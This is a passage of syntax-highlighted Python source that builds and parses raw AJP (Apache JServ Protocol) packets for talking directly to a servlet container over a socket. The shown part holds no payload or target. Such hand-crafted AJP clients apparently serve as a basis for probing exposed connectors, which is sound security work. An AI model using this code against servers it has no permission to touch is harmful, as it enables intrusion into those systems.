            <span class="n">res</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;H&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="n">data</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">data_direction</span> <span class="o">==</span> <span class="n">AjpBodyRequest</span><span class="o">.</span><span class="n">SERVER_TO_CONTAINER</span><span class="p">:</span>
            <span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;bbH&quot;</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;bbH&quot;</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">header</span> <span class="o">+</span> <span class="n">res</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">send_and_receive</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">serialize</span><span class="p">()</span>
            <span class="n">socket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
            <span class="k">while</span> <span class="n">r</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">!=</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">GET_BODY_CHUNK</span> <span class="ow">and</span> <span class="n">r</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">!=</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">SEND_HEADERS</span><span class="p">:</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">SEND_HEADERS</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="k">break</span>


<span class="k">class</span><span class="w"> </span><span class="nc">AjpForwardRequest</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="n">_</span><span class="p">,</span> <span class="n">OPTIONS</span><span class="p">,</span> <span class="n">GET</span><span class="p">,</span> <span class="n">HEAD</span><span class="p">,</span> <span class="n">POST</span><span class="p">,</span> <span class="n">PUT</span><span class="p">,</span> <span class="n">DELETE</span><span class="p">,</span> <span class="n">TRACE</span><span class="p">,</span> <span class="n">PROPFIND</span><span class="p">,</span> <span class="n">PROPPATCH</span><span class="p">,</span> <span class="n">MKCOL</span><span class="p">,</span> <span class="n">COPY</span><span class="p">,</span> <span class="n">MOVE</span><span class="p">,</span> <span class="n">LOCK</span><span class="p">,</span> <span class="n">UNLOCK</span><span class="p">,</span> <span class="n">ACL</span><span class="p">,</span> <span class="n">REPORT</span><span class="p">,</span> <span class="n">VERSION_CONTROL</span><span class="p">,</span> <span class="n">CHECKIN</span><span class="p">,</span> <span class="n">CHECKOUT</span><span class="p">,</span> <span class="n">UNCHECKOUT</span><span class="p">,</span> <span class="n">SEARCH</span><span class="p">,</span> <span class="n">MKWORKSPACE</span><span class="p">,</span> <span class="n">UPDATE</span><span class="p">,</span> <span class="n">LABEL</span><span class="p">,</span> <span class="n">MERGE</span><span class="p">,</span> <span class="n">BASELINE_CONTROL</span><span class="p">,</span> <span class="n">MKACTIVITY</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span>
        <span class="mi">28</span><span class="p">)</span>
    <span class="n">REQUEST_METHODS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;GET&#39;</span><span class="p">:</span> <span class="n">GET</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span> <span class="n">POST</span><span class="p">,</span> <span class="s1">&#39;HEAD&#39;</span><span class="p">:</span> <span class="n">HEAD</span><span class="p">,</span>
                       <span class="s1">&#39;OPTIONS&#39;</span><span class="p">:</span> <span class="n">OPTIONS</span><span class="p">,</span> <span class="s1">&#39;PUT&#39;</span><span class="p">:</span> <span class="n">PUT</span><span class="p">,</span> <span class="s1">&#39;DELETE&#39;</span><span class="p">:</span> <span class="n">DELETE</span><span class="p">,</span> <span class="s1">&#39;TRACE&#39;</span><span class="p">:</span> <span class="n">TRACE</span><span class="p">}</span>
    <span class="c1"># server == web server, container == servlet</span>
    <span class="n">SERVER_TO_CONTAINER</span><span class="p">,</span> <span class="n">CONTAINER_TO_SERVER</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">COMMON_HEADERS</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;SC_REQ_ACCEPT&quot;</span><span class="p">,</span>
                      <span class="s2">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_AUTHORIZATION&quot;</span><span class="p">,</span>
                      <span class="s2">&quot;SC_REQ_CONNECTION&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_CONTENT_TYPE&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_CONTENT_LENGTH&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_COOKIE&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_COOKIE2&quot;</span><span class="p">,</span>
                      <span class="s2">&quot;SC_REQ_HOST&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_PRAGMA&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_REFERER&quot;</span><span class="p">,</span> <span class="s2">&quot;SC_REQ_USER_AGENT&quot;</span>
                      <span class="p">]</span>
    <span class="n">ATTRIBUTES</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;context&quot;</span><span class="p">,</span> <span class="s2">&quot;servlet_path&quot;</span><span class="p">,</span> <span class="s2">&quot;remote_user&quot;</span><span class="p">,</span> <span class="s2">&quot;auth_type&quot;</span><span class="p">,</span> <span class="s2">&quot;query_string&quot;</span><span class="p">,</span> <span class="s2">&quot;route&quot;</span><span class="p">,</span>
                  <span class="s2">&quot;ssl_cert&quot;</span><span class="p">,</span> <span class="s2">&quot;ssl_cipher&quot;</span><span class="p">,</span> <span class="s2">&quot;ssl_session&quot;</span><span class="p">,</span> <span class="s2">&quot;req_attribute&quot;</span><span class="p">,</span> <span class="s2">&quot;ssl_key_size&quot;</span><span class="p">,</span> <span class="s2">&quot;secret&quot;</span><span class="p">,</span> <span class="s2">&quot;stored_method&quot;</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data_direction</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">=</span> <span class="mh">0x02</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">remote_host</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">server_name</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">server_port</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">is_ssl</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">num_headers</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">request_headers</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">attributes</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">data_direction</span> <span class="o">=</span> <span class="n">data_direction</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">pack_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">num_headers</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">request_headers</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;h&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">num_headers</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">h_name</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">request_headers</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">h_name</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;SC_REQ&quot;</span><span class="p">):</span>
                <span class="n">code</span> <span class="o">=</span> <span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">COMMON_HEADERS</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">h_name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;BB&quot;</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="n">h_name</span><span class="p">)</span>

            <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">request_headers</span><span class="p">[</span><span class="n">h_name</span><span class="p">])</span>
        <span class="k">return</span> <span class="n">res</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">pack_attributes</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
        <span class="k">for</span> <span class="n">attr</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">attributes</span><span class="p">:</span>
            <span class="n">a_name</span> <span class="o">=</span> <span class="n">attr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
            <span class="n">code</span> <span class="o">=</span> <span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">ATTRIBUTES</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">a_name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;b&quot;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">a_name</span> <span class="o">==</span> <span class="s2">&quot;req_attribute&quot;</span><span class="p">:</span>
                <span class="n">aa_name</span><span class="p">,</span> <span class="n">a_value</span> <span class="o">=</span> <span class="n">attr</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
                <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="n">aa_name</span><span class="p">)</span>
                <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="n">a_value</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="n">attr</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">])</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">res</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;bb&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">method</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">protocol</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">req_uri</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">remote_addr</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">remote_host</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">pack_string</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">server_name</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;h&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_port</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;?&quot;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_ssl</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pack_headers</span><span class="p">()</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pack_attributes</span><span class="p">()</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">data_direction</span> <span class="o">==</span> <span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">SERVER_TO_CONTAINER</span><span class="p">:</span>
            <span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;bbh&quot;</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;bbh&quot;</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">header</span> <span class="o">+</span> <span class="n">res</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">raw_packet</span><span class="p">):</span>
        <span class="n">stream</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">(</span><span class="n">raw_packet</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">magic1</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">magic2</span><span class="p">,</span> <span class="n">data_len</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;bbH&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;bb&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">remote_host</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">server_name</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">server_port</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;h&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">is_ssl</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;?&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">num_headers</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;H&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">request_headers</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num_headers</span><span class="p">):</span>
            <span class="n">code</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;H&quot;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">code</span> <span class="o">&gt;</span> <span class="mh">0xA000</span><span class="p">:</span>
                <span class="n">h_name</span> <span class="o">=</span> <span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">COMMON_HEADERS</span><span class="p">[</span><span class="n">code</span> <span class="o">-</span> <span class="mh">0xA001</span><span class="p">]</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">h_name</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">s&quot;</span> <span class="o">%</span> <span class="n">code</span><span class="p">)</span>
                <span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># \0</span>
            <span class="n">h_value</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">request_headers</span><span class="p">[</span><span class="n">h_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">h_value</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">send_and_receive</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">stream</span><span class="p">,</span> <span class="n">save_cookies</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
        <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">serialize</span><span class="p">())</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="n">AjpForwardRequest</span><span class="o">.</span><span class="n">POST</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">res</span>

        <span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">SEND_HEADERS</span>
        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">save_cookies</span> <span class="ow">and</span> <span class="s1">&#39;Set-Cookie&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response_headers</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;SC_REQ_COOKIE&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">response_headers</span><span class="p">[</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">]</span>

        <span class="c1"># read body chunks and end response packets</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
            <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">END_RESPONSE</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="k">elif</span> <span class="n">r</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">SEND_BODY_CHUNK</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">raise</span> <span class="ne">NotImplementedError</span>
                <span class="k">break</span>

        <span class="k">return</span> <span class="n">res</span>


<span class="k">class</span><span class="w"> </span><span class="nc">AjpResponse</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">SEND_BODY_CHUNK</span><span class="p">,</span> <span class="n">SEND_HEADERS</span><span class="p">,</span> <span class="n">END_RESPONSE</span><span class="p">,</span> <span class="n">GET_BODY_CHUNK</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span>
        <span class="mi">7</span><span class="p">)</span>
    <span class="n">COMMON_SEND_HEADERS</span> <span class="o">=</span> <span class="p">[</span>
        <span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;Content-Language&quot;</span><span class="p">,</span> <span class="s2">&quot;Content-Length&quot;</span><span class="p">,</span> <span class="s2">&quot;Date&quot;</span><span class="p">,</span> <span class="s2">&quot;Last-Modified&quot;</span><span class="p">,</span>
        <span class="s2">&quot;Location&quot;</span><span class="p">,</span> <span class="s2">&quot;Set-Cookie&quot;</span><span class="p">,</span> <span class="s2">&quot;Set-Cookie2&quot;</span><span class="p">,</span> <span class="s2">&quot;Servlet-Engine&quot;</span><span class="p">,</span> <span class="s2">&quot;Status&quot;</span><span class="p">,</span> <span class="s2">&quot;WWW-Authenticate&quot;</span>
    <span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
        <span class="c1"># read headers</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">magic</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">data_length</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;HHb&quot;</span><span class="p">)</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">SEND_HEADERS</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">parse_send_headers</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">SEND_BODY_CHUNK</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">parse_send_body_chunk</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">END_RESPONSE</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">parse_end_response</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">GET_BODY_CHUNK</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">parse_get_body_chunk</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">raise</span> <span class="ne">NotImplementedError</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_send_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">http_status_code</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;H&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">http_status_msg</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">num_headers</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;H&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">response_headers</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">num_headers</span><span class="p">):</span>
            <span class="n">code</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;&gt;H&quot;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">code</span> <span class="o">&lt;=</span> <span class="mh">0xA000</span><span class="p">:</span>  <span class="c1"># custom header</span>
                <span class="n">h_name</span><span class="p">,</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">%d</span><span class="s2">s&quot;</span> <span class="o">%</span> <span class="n">code</span><span class="p">)</span>
                <span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># \0</span>
                <span class="n">h_value</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">h_name</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="o">.</span><span class="n">COMMON_SEND_HEADERS</span><span class="p">[</span><span class="n">code</span><span class="o">-</span><span class="mh">0xA001</span><span class="p">]</span>
                <span class="n">h_value</span> <span class="o">=</span> <span class="n">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">response_headers</span><span class="p">[</span><span class="n">h_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">h_value</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">parse_send_body_chunk</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
